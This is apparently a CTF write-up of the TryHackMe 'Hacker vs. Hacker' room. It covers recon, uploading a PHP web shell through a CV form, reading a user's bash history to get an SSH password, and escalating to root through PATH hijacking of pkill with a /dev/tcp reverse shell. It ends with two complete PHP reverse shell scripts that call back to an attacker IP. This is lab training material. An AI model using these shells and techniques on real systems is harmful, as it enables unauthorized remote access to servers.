# TryHackMe Hacker vs. Hacker Writeup

<img width="1906" height="349" alt="image" src="https://github.com/user-attachments/assets/6cffac5d-2edd-4db9-a390-038a719b517c" />

---------

## Nmap Scan

```
nmap -sCV -Pn 10.114.177.155
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 03:53 EST
Nmap scan report for 10.114.177.155
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds

```

----

<img width="1919" height="795" alt="image" src="https://github.com/user-attachments/assets/d88dfceb-4e71-422b-b3b0-dfbef8f252ad" />

## gobuster

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.114.177.155
```

<img width="1113" height="555" alt="image" src="https://github.com/user-attachments/assets/9bb224b6-9f32-496b-8b03-94589c3b2e1d" />

## found in end of page upload your cv 

<img width="1108" height="436" alt="image" src="https://github.com/user-attachments/assets/43372479-d6a4-4df6-9e25-5856b200e990" />

<img width="1698" height="516" alt="image" src="https://github.com/user-attachments/assets/3667889a-a2b7-4d81-8709-bea34c5f2941" />

## i uploaded file call **`shell.pdf.php`**

```
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

<img width="809" height="187" alt="image" src="https://github.com/user-attachments/assets/469a8222-564c-440c-b2b1-165c5101e6f7" />

<img width="955" height="181" alt="image" src="https://github.com/user-attachments/assets/57727e91-1312-4a42-b4aa-9e53f05662c7" />

```
http://10.114.177.155/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history
```

<img width="757" height="145" alt="image" src="https://github.com/user-attachments/assets/baf6a1aa-123c-4c82-adbc-e988f62f8f05" />

```
lachlan : thisistheway123
```

<img width="1011" height="681" alt="image" src="https://github.com/user-attachments/assets/249b421a-ec75-42df-ae83-8d1b74863872" />

## shell colse very fast

## i try 

```
ssh lachlan@10.114.177.155 "id; ls; whoami; pwd"
ssh lachlan@10.114.177.155 -t "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
```

<img width="692" height="190" alt="image" src="https://github.com/user-attachments/assets/93c53121-8bb9-478d-a1bb-ac79e271d3a3" />

<img width="939" height="214" alt="image" src="https://github.com/user-attachments/assets/10f4b283-4c12-4312-a31e-69361d94e09e" />

## still colsing the shell 

## After a bit of research, I found a simple trick to bypass it:

```
ssh lachlan@10.10.117.47 -T
```

# Privilege Escalation to Root via PATH Hijacking

<img width="1228" height="230" alt="image" src="https://github.com/user-attachments/assets/00fbbe86-0559-487a-bf83-17081974e44c" />

```
PATH=/home/lachlan/bin:/bin:/usr/bin
```

## look at path it look first to /home/lachlan

```
echo "bash -c 'bash -i >& /dev/tcp/192.168.137.69/9999 0>&1'" > bin/pkill ; chmod +x bin/pkill
chmod +x /home/lachlan/bin/pkill
```

<img width="889" height="175" alt="image" src="https://github.com/user-attachments/assets/d56d0ff5-2577-498b-bf76-e19de54ae6b6" />

<img width="894" height="295" alt="image" src="https://github.com/user-attachments/assets/1f63ae54-8bfc-497b-99c2-3e0b0a888629" />

```php
<?php
// PHP Reverse Shell
set_time_limit(0);
$ip = '192.168.137.69';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(
    0 => $sock,
    1 => $sock,
    2 => $sock
), $pipes);
proc_close($proc);
?>
```

````
<?php
// PHP Reverse Shell
set_time_limit(0);
$ip = '192.168.137.69';  // Your IP
$port = 4444;            // Your port

// Try different reverse shell methods
if (function_exists('exec')) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
} elseif (function_exists('system')) {
    system("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
} elseif (function_exists('shell_exec')) {
    shell_exec("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
} elseif (function_exists('passthru')) {
    passthru("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
} else {
    // Fallback: fsockopen method
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh -i', array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    ), $pipes);
    proc_close($proc);
}
?>
````

